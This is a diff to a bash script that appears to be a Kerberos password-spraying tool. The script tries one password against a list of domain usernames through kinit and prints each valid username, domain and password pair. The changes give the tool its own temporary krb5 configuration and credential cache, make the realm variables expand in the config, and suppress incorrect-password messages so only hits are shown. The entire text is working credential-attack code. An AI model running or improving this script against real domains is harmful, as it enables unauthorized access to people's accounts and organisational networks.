@@ -25,9 +25,10 @@ echo "[+] Kerberos Realm: $DOMAIN"
 echo "[+] KDC: $DOMAINCONTROLLER"
 echo ""
 
-KRB5_CONF=$(mktemp)
+k5config=$(mktemp)
+k5cache=$(mktemp)
 
-cat > $KRB5_CONF <<'asdfasdf'
+cat > $k5config <<asdfasdf
 [libdefaults]
 	default_realm = $DOMAIN
 [realms]
@@ -43,7 +44,7 @@ COUNT=0
 while read USERNAME; do
 	USERNAME=$(echo $USERNAME | awk -F@ '{print $1}')
 	RESULT=$(
-	echo $PASSWORD | kinit --password-file=STDIN $USERNAME 2>&1
+	echo $PASSWORD | KRB5_CONFIG=$k5config KRB5CCNAME=$k5cache kinit --password-file=STDIN $USERNAME 2>&1
 	)
 	if [[ $RESULT == *"unable to reach"* ]]; then
 		echo "[!] Unable to find KDC for realm. Check domain and DC"
@@ -56,6 +57,9 @@ while read USERNAME; do
 	elif [[ $RESULT == *"Client"* ]] && [[ $RESULT == *"unknown"* ]]; then
 		# username does not exist
 		: # pass
+  elif [[ $RESULT == *"Password incorrect"* ]]; then
+    # password incorrect
+    : #pass
 	elif [[ -z "$RESULT" ]]; then
 		echo "[+] Valid: $USERNAME@$DOMAIN : $PASSWORD"
 	else
